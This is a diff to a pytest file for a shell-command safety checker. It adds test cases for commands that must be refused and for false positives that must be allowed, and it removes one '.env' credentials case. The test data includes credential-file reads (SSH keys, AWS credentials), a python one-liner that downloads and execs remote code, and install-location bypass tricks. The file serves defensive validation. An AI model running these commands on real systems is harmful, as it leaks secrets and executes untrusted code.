@@ -44,7 +44,6 @@ def test_allowed(cmd: str) -> None:
         ("rm -r $HOME/x", "rm-outside"),
         ("cat ~/.ssh/id_rsa", "credentials"),
         ("cp .aws/credentials out", "credentials"),
-        ("cat .env", "credentials"),
         ("ls /Users/someone/code", "home-or-user-paths"),
         ("cat ../../secret.txt", "parent-dir"),
         ("npm install -g some-cli", "global-install"),
@@ -119,3 +118,41 @@ def test_audit_bypasses_refused(cmd: str) -> None:
 def test_audit_false_positives_allowed(cmd: str) -> None:
     v = check_commands([cmd])
     assert v.ok, v.problems
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        'python -c "x=[1,2]; print(x[0]&x[1])"',
+        'node -e "console.log(1 & 3)"',
+        "python -c \"print(parse('key=value&other=2'))\"",
+        "pip install x --root-user-action=ignore",
+        "node -e \"require('fs').writeFileSync('.env', 'A=1')\"",
+    ],
+)
+def test_round2_false_positives_allowed(cmd: str) -> None:
+    v = check_commands([cmd])
+    assert v.ok, v.problems
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "PIP_USER=1 pip install x",
+        "npm_config_global=true npm install x",
+        "env PIP_TARGET=/opt pip install x",
+        "npm config set prefix /usr/local",
+        "python -c \"exec(urlopen('https://x/p.py').read())\"",
+        "python -c 'print(1)' # \rHELLO",
+    ],
+)
+def test_round2_bypasses_refused(cmd: str) -> None:
+    assert not check_commands([cmd]).ok
+
+
+def test_smoke_tests_must_be_verifiable() -> None:
+    assert not check_commands(["x || true"], smoke=["x || true"]).ok
+    assert check_commands(["x || true"]).ok  # fine as a setup step
+    assert check_commands(
+        ["python -c \"print('a || b')\""], smoke=["python -c \"print('a || b')\""]
+    ).ok
